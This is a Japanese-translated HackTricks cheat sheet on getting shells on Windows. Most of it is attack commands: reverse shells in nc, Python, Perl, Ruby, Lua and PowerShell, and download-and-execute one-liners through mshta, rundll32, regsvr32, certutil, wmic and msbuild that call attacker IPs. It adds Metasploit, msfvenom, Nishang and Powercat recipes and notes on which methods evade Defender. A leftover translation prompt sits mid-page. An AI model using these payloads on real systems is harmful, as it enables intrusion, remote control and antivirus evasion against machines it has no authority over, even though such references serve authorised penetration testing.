# シェル - Windows

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

より重要な脆弱性を見つけて、より早く修正する。Intruderはあなたの攻撃面を追跡し、積極的な脅威スキャンを実行し、APIからウェブアプリ、クラウドシステムまで、あなたの全技術スタックにわたる問題を見つけます。今日[**無料で試す**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Lolbas

ページ [lolbas-project.github.io](https://lolbas-project.github.io/) はWindowsにとって、[https://gtfobins.github.io/](https://gtfobins.github.io/) がLinuxにとってのものです。
当然ながら、**WindowsにはSUIDファイルやsudo権限はありません**が、いくつかの**バイナリ**がどのようにして予期せぬアクションを実行するために（悪用）使用されるか、例えば**任意のコードを実行する**などを知ることは有用です。

## NC
```bash
nc.exe -e cmd.exe <Attacker_IP> <PORT>
```
## SBD

**sbd**はNetcatのクローンで、ポータブルで強力な暗号化を提供するように設計されています。Unix系オペレーティングシステムとMicrosoft Win32で動作します。sbdにはAES-CBC-128 + HMAC-SHA1暗号化（Christophe Devineによる）、プログラム実行（-eオプション）、ソースポートの選択、遅延を伴う連続再接続など、いくつかの便利な機能があります。sbdはTCP/IP通信のみをサポートしています。sbd.exe（Kali linuxディストリビューションの一部：/usr/share/windows-resources/sbd/sbd.exe）は、WindowsボックスにNetcatの代替としてアップロードすることができます。

## Python
```bash
#Windows
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
## Perl
```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby
```bash
#Windows
ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## Lua
```bash
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## OpenSSH

攻撃者 (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
被害者
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## Powershell
```bash
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
```
プロセスがネットワークコールを実行：**powershell.exe**\
ディスクに書き込まれたペイロード：**いいえ** (_少なくとも、procmonを使用して見つけることはできませんでした！_)
```bash
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```
プロセスがネットワーク呼び出しを実行：**svchost.exe**\
ディスクに書き込まれたペイロード：**WebDAVクライアントのローカルキャッシュ**

**ワンライナー：**
```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
**このドキュメントの最後にあるさまざまなPowershell Shellsに関する詳細情報を入手してください**

## Mshta
```bash
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```
プロセスがネットワークコールを実行：**mshta.exe**\
ディスクに書き込まれたペイロード：**IE ローカルキャッシュ**
```bash
mshta http://webserver/payload.hta
```
プロセスがネットワークコールを実行：**mshta.exe**\
ディスクに書き込まれたペイロード：**IE ローカルキャッシュ**
```bash
mshta \\webdavserver\folder\payload.hta
```
プロセスがネットワーク呼び出しを実行: **svchost.exe**\
ディスクに書き込まれたペイロード: **WebDAVクライアントのローカルキャッシュ**

#### **hta-pshリバースシェルの例 (htaを使用してPSバックドアをダウンロードして実行)**
```markup
<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
```
**Koadicゾンビは、stager htaを使用して非常に簡単にダウンロード＆実行できます**

#### htaの例
```markup
<html>
<head>
<HTA:APPLICATION ID="HelloExample">
<script language="jscript">
var c = "cmd.exe /c calc.exe";
new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```
**抜粋元** [**こちら**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)

#### **mshta - sct**
```markup
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
**抜粋元** [**こちら**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)

#### **Mshta - Metasploit**
```bash
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```

```bash
Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
```
**Defenderによって検出された**

## **Rundll32**

[**Dll ハローワールド例**](https://github.com/carterjones/hello-world-dll)
```bash
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```
プロセスがネットワーク呼び出しを実行：**svchost.exe**\
ディスクに書き込まれたペイロード：**WebDAVクライアントのローカルキャッシュ**
```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```
プロセスがネットワーク呼び出しを実行：**rundll32.exe**\
ディスクに書き込まれたペイロード：**IE ローカルキャッシュ**

**Defenderによって検出されました**

**Rundll32 - sct**
```bash
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
**抜粋元** [**こちら**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)

#### **Rundll32 - Metasploit**
```bash
use windows/smb/smb_delivery
run
#You will be given the command to run in the victim: rundll32.exe \\10.2.0.5\Iwvc\test.dll,0
```
**Rundll32 - Koadic**
```bash
use stager/js/rundll32_js
set SRVHOST 192.168.1.107
set ENDPOINT sales
run
#Koadic will tell you what you need to execute inside the victim, it will be something like:
rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.2.0.5:9997/ownmG",false);x.send();eval(x.responseText);window.close();
```
## Regsvr32
```bash
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```
プロセスがネットワークコールを実行：**regsvr32.exe**\
ディスクに書き込まれたペイロード：**IE ローカルキャッシュ**
```
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```
プロセスがネットワークコールを実行：**svchost.exe**\
ディスクに書き込まれたペイロード：**WebDAVクライアントのローカルキャッシュ**

**Defenderによって検出された**

#### Regsvr32 -sct
```markup
<?XML version="1.0"?>
<!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
<!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
<scriptlet>
<registration
progid="PoC"
classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</registration>
</scriptlet>
```
**抜粋元** [**こちら**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)

#### **Regsvr32 - Metasploit**
```bash
use multi/script/web_delivery
set target 3
set payload windows/meterpreter/reverse/tcp
set lhost 10.2.0.5
run
#You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
```
**Koadicゾンビは、stager regsvrを使用して非常に簡単にダウンロード＆実行できます**

## Certutil

B64dllをダウンロードし、デコードして実行します。
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```
B64exeをダウンロードし、デコードして実行します。
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```
**Defenderによって検出されました**

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

最も重要な脆弱性を見つけて、より早く修正できるようにします。Intruderは攻撃面を追跡し、積極的な脅威スキャンを実行し、APIからウェブアプリ、クラウドシステムまで、技術スタック全体にわたる問題を見つけ出します。今日[**無料でお試し**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)してください。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## **Cscript/Wscript**
```bash
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```
**Cscript - Metasploit**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
```
**Defenderによって検出された**

## PS-Bat
```bash
\\webdavserver\folder\batchfile.bat
```
プロセスがネットワーク呼び出しを実行：**svchost.exe**\
ディスクに書き込まれたペイロード：**WebDAVクライアントのローカルキャッシュ**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
impacket-smbserver -smb2support kali `pwd`
```

```bash
\\10.8.0.3\kali\shell.bat
```
**Defenderによって検出された**

## **MSIExec**

攻撃者
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
python -m SimpleHTTPServer 80
```
被害者:
```
victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
```
**検出された**

## **Wmic**
```
wmic os get /format:"https://webserver/payload.xsl"
```
プロセスがネットワークコールを実行：**wmic.exe**\
ディスクに書き込まれたペイロード：**IE ローカルキャッシュ**

例のxslファイル：
```
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
]]>
</ms:script>
</stylesheet>
```
以下は、ハッキング技術に関するハッキングの本からの内容です。関連する英語テキストを日本語に翻訳し、まったく同じマークダウンおよびhtml構文を保持して翻訳を返してください。コード、ハッキング技術名、ハッキング用語、クラウド/SaaSプラットフォーム名（Workspace、aws、gcpなど）、'leak'という単語、ペネトレーションテスト、およびマークダウンタグのようなものは翻訳しないでください。また、翻訳とマークダウン構文以外の余分なものは何も追加しないでください。

[こちら](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)から抜粋

**検出されません**

**stager wmicを使用して、非常に簡単にKoadicゾンビをダウンロード＆実行できます**

## Msbuild
```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```
ネットワーク呼び出しを行うプロセス：**svchost.exe**\
ディスクに書き込まれたペイロード：**WebDAVクライアントローカルキャッシュ**

この技術を使用してアプリケーションホワイトリストとPowershell.exeの制限をバイパスできます。PSシェルがプロンプトされます。\
これをダウンロードして実行するだけです：[https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```
**検出されていません**

## **CSC**

被害者マシンでC#コードをコンパイルします。
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
```
以下は基本的なC#リバースシェルをダウンロードできるリンクです: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)

**検出されていない**

## **Regasm/Regsvc**
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```
ネットワーク呼び出しを行うプロセス: **svchost.exe**\
ディスクに書き込まれたペイロード: **WebDAVクライアントのローカルキャッシュ**

**試していません**

[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)

## Odbcconf
```
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```
ネットワークコールを実行するプロセス：**svchost.exe**\
ディスクに書き込まれたペイロード：**WebDAVクライアントローカルキャッシュ**

**試していません**

[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)

## Powershell シェル

### PS-Nishang

[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

**Shells** フォルダには、さまざまなシェルがあります。Invoke-_PowerShellTcp.ps1_ をダウンロードして実行するには、スクリプトのコピーを作成し、ファイルの末尾に追加します：
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
```
スクリプトをウェブサーバーで提供し始め、被害者の端末で実行します：
```
powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
```
Defenderはそれを悪意のあるコードとして検出していません（まだ、2019年4月3日現在）。

**TODO: 他のnishangシェルをチェックする**

### **PS-Powercat**

[**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)

ダウンロードし、Webサーバーを起動し、リスナーを開始し、被害者の端末で実行します：
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
Defenderはそれを悪意のあるコードとして検出していません（まだ、2019年3月4日現在）。

**powercatによって提供される他のオプション：**

バインドシェル、リバースシェル（TCP、UDP、DNS）、ポートリダイレクト、アップロード/ダウンロード、ペイロード生成、ファイル提供...
```
Serve a cmd Shell:
powercat -l -p 443 -e cmd
Send a cmd Shell:
powercat -c 10.1.1.1 -p 443 -e cmd
Send a powershell:
powercat -c 10.1.1.1 -p 443 -ep
Send a powershell UDP:
powercat -c 10.1.1.1 -p 443 -ep -u
TCP Listener to TCP Client Relay:
powercat -l -p 8000 -r tcp:10.1.1.16:443
Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
powercat -c 10.1.1.15 -p 443 -e cmd -g
Start A Persistent Server That Serves a File:
powercat -l -p 443 -i C:\inputfile -rep
```
### Empire

[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

Powershellランチャーを作成し、ファイルに保存してダウンロードして実行します。
```
powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
**悪意のあるコードとして検出**

### MSF-Unicorn

[https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

Unicornを使用してmetasploitバックドアのpowershellバージョンを作成
```
python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
```
msfconsole を作成したリソースで起動します:
```
msfconsole -r unicorn.rc
```
ウェブサーバーを起動して _powershell\_attack.txt_ ファイルを提供し、被害者のコンピュータで実行します：
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
```
**悪意のあるコードとして検出されました**

## 詳細

[PS>Attack](https://github.com/jaredhaight/PSAttack) 攻撃的なPSモジュールがプリロードされたPSコンソール（暗号化されています）\
[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
WinPWN](https://github.com/SecureThisShit/WinPwn) 攻撃的なPSモジュールとプロキシ検出機能を備えたPSコンソール（IEX）

## 参考文献

* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
* [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
* [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
* [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

​

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

最も重要な脆弱性を見つけて、より早く修正しましょう。Intruderは攻撃面を追跡し、積極的な脅威スキャンを実行し、APIからウェブアプリ、クラウドシステムまで、技術スタック全体にわたる問題を見つけ出します。今日[**無料でお試し**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)ください。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローに学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションをチェックしてください。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有**してください。

</details>
